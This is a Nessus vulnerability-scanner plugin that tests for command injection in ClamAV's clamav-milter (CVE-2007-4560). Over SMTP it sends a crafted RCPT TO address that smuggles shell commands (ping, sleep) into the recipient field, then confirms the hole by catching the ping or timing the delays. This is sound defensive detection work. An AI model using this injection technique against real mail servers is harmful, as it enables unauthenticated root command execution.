#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29830);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2007-4560");
  script_bugtraq_id(25439);
  script_xref(name:"OSVDB", value:"36909");

  script_name(english:"ClamAV clamav-milter black-hole-mode Sendmail Recipient Field Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via clamav-milter");

 script_set_attribute(attribute:"synopsis", value:
"The remote mail server allows execution of arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running a version of Clamav-milter, a
filter for sendmail, configured with '--black-hole-mode' that fails to
sanitize recipient addresses of shell metacharacters before using them
in a call to 'popen()' to determine whether to discard incoming
messages.  An unauthenticated remote attacker can leverage this issue
to execute arbitrary code, typically as root." );
 script_set_attribute(attribute:"see_also", value:"http://www.nruns.com/security_advisory_clamav_remote_code_exection.php" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/477723/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-12/0519.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ClamAV 0.91.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");
  script_dependencies("smtpserver_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("SMTP/wrapped");
  script_require_ports("Services/smtp", 25);

  exit(0);
}


include("global_settings.inc");
include("smtp_func.inc");


if (! thorough_tests ) exit(0);


# Don't bother checking Windows as ClamAV isn't known to run on it.
os = get_kb_item("Host/OS");
if (os && "Windows" >< os) exit(0);


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# Open a connection.
soc = smtp_open(port:port, helo:this_host_name());
if (!soc) exit(0);


from = "";                             # nb: must be a valid sender
rcpt = "nobody";                       # nb: must be a valid recipient on remote


# Try to ping the Nessus host with a special pattern.
ping_pat = "cafebabe";
cmd = string("sleep 1; ping -p ", ping_pat, " -c 3 ", this_host_name());
filter = string("icmp and icmp[0] = 8 and src host ", get_host_ip());

c = string('MAIL FROM: <', from, '>');
send(socket:soc, data:string(c, "\r\n"));
s = smtp_recv_line(socket:soc);
if (strlen(s) && ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
{
  c = string('RCPT TO: <', rcpt, '+"|', cmd, '"@localhost>');
  send(socket:soc, data:string(c, "\r\n"));
  s = smtp_recv_line(socket:soc);
  if (strlen(s) && ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
  {
    c = 'DATA';
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);
    if (strlen(s) && ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
    {
      c = '.';
      s = send_capture(socket:soc, data:string(c, "\r\n"), pcap_filter:filter);
      icmp_data = get_icmp_element(icmp:s, element:"data");

      if (tolower(ping_pat) >< tolower(hexstr(icmp_data)))
      {
        smtp_close(socket:soc);
        security_hole(port);
        exit(0);
      }
    }
  }
}


# Try several times to exploit the issue to pause execution for a bit.
#
# nb: this sort of check might be problemmatic if the nessusd host
#     is heavily loaded.
if ( report_paranoia < 2 ) exit(0);

if (thorough_tests) delays = make_list(1, 6, 11, 16, 21);
else delays = make_list(1, 4, 7);
pauses = make_array();

foreach delay (delays)
{
  cmd = string("sleep ", delay+1);

  c = string('MAIL FROM: <', from, '>');
  send(socket:soc, data:string(c, "\r\n"));
  s = smtp_recv_line(socket:soc);
  if (strlen(s) && ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
  {
    c = string('RCPT TO: <', rcpt, '+"|', cmd, '"@localhost>');
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);
    if (strlen(s) && ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
    {
      c = 'DATA';
      send(socket:soc, data:string(c, "\r\n"));
      s = smtp_recv_line(socket:soc);
      if (strlen(s) && ereg(pattern:"^[2-3][0-9][0-9] .*", string:s))
      {
        # Time how long the remote takes to respond.
        start = unixtime();
        c = '.';
        send(socket:soc, data:string(c, "\r\n"));
        s = smtp_recv_line(socket:soc, retry:5);
        end = unixtime();

        pause = end - start;
        pauses[delay] = pause;
        # nb: we're done if the delay obviously had no effect.
        if (strlen(s) && pause < delay) break;
      }
      else break;
    }
    else break;
  }
  else break;
}
smtp_close(socket:soc);


# Look at the actual time taken for each test.
prev_diff = NULL;
foreach delay (delays)
{
  # Exit if for some reason we didn't complete all the tests.
  if (isnull(pauses[delay])) exit(0);

  # Exit if we're not being paranoid and the second order difference
  # between tests is +-1 second of the expected difference, so we
  # can be reasonably certain the plugin is responsible for the
  # delays rather than a load issue on the remote.
  diff = pauses[delay];
  if (report_paranoia < 2 && !isnull(prev_diff)) 
  {
    diff2 = diff - prev_diff;
    if (
      (thorough_tests  && (diff2 < 4 || diff2 > 6)) ||
      (!thorough_tests && (diff2 < 2 || diff2 > 4))
    ) exit(0);
  }
  prev_diff = diff;
}
security_hole(port);
